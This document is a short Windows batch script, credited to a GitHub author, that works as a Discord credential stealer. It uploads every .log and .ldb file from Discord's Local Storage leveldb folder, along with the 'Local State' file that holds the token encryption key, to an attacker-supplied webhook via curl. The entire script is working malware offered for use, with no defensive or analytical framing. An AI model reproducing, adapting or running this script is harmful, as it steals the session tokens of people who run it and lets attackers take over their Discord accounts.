@echo off
set webhook=YOURWEBHOOK
for %%f in ("%appdata%\discord\Local Storage\leveldb\*.log") do curl -F c=@"%%f" %webhook%
::made by https://github.com/baum1810
for %%f in ("%appdata%\discord\Local Storage\leveldb\*.ldb") do curl -F c=@"%%f" %webhook%
curl -F c=@"%appdata%\discord\Local State" %webhook%
